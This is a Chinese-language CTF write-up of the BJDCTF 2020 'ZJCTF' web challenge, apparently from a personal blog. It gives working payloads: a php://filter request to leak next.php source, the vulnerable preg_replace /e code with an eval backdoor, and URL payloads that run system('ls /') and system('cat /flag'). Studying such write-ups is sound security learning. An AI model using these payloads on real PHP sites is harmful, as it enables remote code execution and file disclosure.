# 【BJDCTF 2020】ZJCTF，不过如此


# [BJDCTF 2020]ZJCTF，不过如此

## 思路
* 进入后是一个GET传参，利用php伪协议得到next.php内容
* next.php是一个php的`preg_replace /e` 模式漏洞利用，执行RCE
* 其中有一些部分需要绕过，最终执行命令得到flag

## EXP
* ?text=data://text/pain,I have a dream&amp;file=php://filter/convert.base64-encode/resource=next.php
* 得到next.php内容

```
&lt;?php
$id = $_GET[&#39;id&#39;];
$_SESSION[&#39;id&#39;] = $id;

function complex($re, $str) {
    return preg_replace(
        &#39;/(&#39; . $re . &#39;)/ei&#39;,
        &#39;strtolower(&#34;\\1&#34;)&#39;,
        $str
    );
}


foreach($_GET as $re =&gt; $str) {
    echo complex($re, $str). &#34;\n&#34;;
}

function getFlag(){
    @eval($_GET[&#39;cmd&#39;]);
}
```

其中的`preg_replace /e` 存在漏洞。

e模式下的preg_replace可以让**第二个参数**&#39;替换字符串&#39;当作代码执行，但是这里第二个参数是**不可变**的。

但因为有这种特殊的情况，正则表达式模式或部分模式两边添加圆括号会将**相关匹配存储到一个临时缓存区**，并且从1开始排序。

而`strtolower(&#34;\1&#34;)`正好表达的就是匹配区的第一个（\\1=\1），从而我们如果匹配可以，则可以将函数实现。
比如我们传入 `?.*={${phpinfo()}}`

```
preg_replace(&#39;/(&#39; . $re . &#39;)/ei&#39;,&#39;strtolower(&#34;\\1&#34;)&#39;,$str);		// 原句

preg_replace(&#39;/(&#39; .* &#39;)/ei&#39;,&#39;strtolower(&#34;\\1&#34;)&#39;,{${phpinfo()}});	// 输入后
```

又因为`$_GET`传入首字母是非法字符时候会把` .`（点号）改成下划线，因此得将`.`换成`\s`

* next.php 页面payload

  ```
  ?\S*=${getFlag()}&amp;cmd=system(&#39;ls /&#39;);
  ?\S*=${getFlag()}&amp;cmd=system(&#39;cat /flag&#39;);
  ```

## 总结
* PHP伪协议
* 正则绕过

---

> Author: [Ting](Tin10g.github.io)  
> URL: http://localhost:1313/posts/2024%E5%81%9A%E9%A2%98-bjdctf-2020zjctf%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/  

